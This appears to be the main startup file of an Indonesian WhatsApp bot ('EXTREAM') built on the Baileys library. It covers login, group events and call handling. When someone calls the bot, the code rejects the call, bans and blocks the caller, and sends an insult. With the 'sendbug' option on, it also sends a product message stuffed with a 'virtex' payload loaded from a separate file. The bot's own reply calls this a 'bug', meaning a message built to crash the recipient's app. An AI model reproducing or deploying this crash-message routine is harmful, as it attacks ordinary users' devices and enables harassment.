const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode, relayWAMessage,prepareMessageFromContent,prepareMessage  } = require('@adiwajshing/baileys')
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection);
const client = new WAConnection()
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
const qrcode = require("qrcode-terminal")
const fs = require("fs");
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const {weton,week,calender,dateIslamic, banner, start, success, getGroupAdmins,close} = require("./lib/functions");
const { color } = require("./lib/color");
const PhoneNumber = require('awesome-phonenumber')     
const blocked = JSON.parse(fs.readFileSync('./database/userblocked.json'))
const { ban } = require("./message/jsonfile");
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
const { addBanned, unBanned, cekBannedUser } = require("./lib/banned");
//const keepAlive = require("./keepalive.js")
Anticall = settings.Anticall
sendbug = settings.sendbug
prefix = settings.setPrefix.prefix
joinExtream = settings.joinGcExtream
ext = settings.SetFunction.ext
const baterai = {
battery: "" || "Belom Terdeteksi",
isCharge: "Sedang di cas" || "Tidak di cas"
}



async function starts() {
	    client.autoReconnect = ReconnectMode.onConnectionLost
	    client.version = [2, 2143, 3]
	    //client.version = [ 5, 9741, 8 ];
	    client.browserDescription = ["EXTREAM","Ubuntu","18.04"]
	    client.logger.level = 'warn'
	    console.log(color(`]─`,`magenta`),`「`,  color(`EXTREAM`,`red`), `」`,  color(`─[`,`magenta`))
	    client.on('qr', () => {
	    console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan Bwang'))
	    })
	    fs.existsSync('./session.json') && client.loadAuthInfo('./session.json')
	    client.on('connecting', () => {
	    console.log(`Connecting...`)
	    })
	    client.on('open', () => {
	    console.log(`[■■■■■■■■■■■■■■■] Connected`) 
	    }) 
	    client.on('ws-close', () => {
        console.log(color("[SYSTEM]", "white"), color('Connection lost, trying to reconnect', 'deeppink'))
        })    
	    await client.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./session.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
          

		      
		      if(settings.nomerlu.startsWith("08")){
		console.log(color('Error nomer owner tidak di temukan','red'))
		console.log(color('Masukin nomernya pake 628xxx Tod, bukan pake 08xxx Ngent ','green'))
		} else if(settings.nomerlu.startsWith("62")){
		client.sendMessage(`${settings.nomerlu}@s.whatsapp.net`,"Bot berhasil tersambung", text)
		}

        if(joinExtream){
        teks = `https://chat.whatsapp.com/GsX10XuzZqQ99jccdcDasi`
        client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
         }
         

        client.welcome = settings.setWelcome.welcomeType
        client.antidel = []
        client._reminder = []
        
client.on('CB:Call',  async (json) => {
if(!Anticall) return
let number = json[1]['from'];
let Nomer =`${number.split("@")[0]}@s.whatsapp.net`
let isOffer = json[1]["type"] == "offer";
pushname = client.contacts[Nomer] != undefined ? client.contacts[Nomer].notify = undefined ? PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[Nomer].notify || client.contacts[Nomer].vname : PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international')
if(cekBannedUser(Nomer, ban)) return
console.log("call dari "+ Nomer)
console.log(pushname)
addBanned (pushname, calender, Nomer, ban) 
addBlock(number, blocked)  
forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
const { virtex8 } = require('./virtex/virtex.js')
davizin = fs.readFileSync('./stik/davizinmaker.jpg')
hmm4 = fs.readFileSync('./stik/fake.jpeg')
        
if (number && isOffer && json[1]["data"]) {
var tag = client.generateMessageTag();
var NodePayload = ["action", "call", ["call", {
                    "from": client.user.jid,
                    "to": number.split("@")[0] + "@s.whatsapp.net",
                    "id": tag
                },
                [
                    ["reject", {
                        "call-id": json[1]['id'],
                        "call-creator": number.split("@")[0] + "@s.whatsapp.net",
                        "count": "0"
                    }, null]
                ]
            ]];
await client.send(`${tag}, ${JSON.stringify(NodePayload)}`)
if(number.startsWith("62")){
var teksnya = "Kamu telah di block,banned + bug karena telpon botz"
} else {
var teksnya = "Fuck you bitch, why you call me huh ? "
}
await client.sendMessage(Nomer, teksnya, MessageType.text)      
if(sendbug){
imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
imeg = imeu.message.imageMessage
res =  client.prepareMessageFromContent(Nomer, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': '',
'title': virtex8(prefix),
'description': virtex8(prefix),
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
 },
'businessOwnerJid': `0@s.whatsapp.net`,
'contextInfo': forward
}
}, {contextInfo: forward}), 
await client.relayWAMessage(res)    
}
await client.blockUser(Nomer, "add") // Block user
await client.modifyChat(Nomer, 'delete').catch(_ => _)
}      
})     
        
        

        client.on("group-update", async (anu) => {
        require('./message/group-settings.js')(client, anu)
        });
        client.on('group-participants-update', async (anu) => {
        require('./message/group.js')(client, anu)
        });
        client.on('CB:Blocklist', json => {
	    if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	    })
	    client.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
        client.on('message-delete', async (m) => {
        require('./message/antidelete.js')(client, m)
        })      
        
        client.on('chat-update', async (message) => {
        require('./index.js')(client, message, baterai )
        })
        


};



starts()













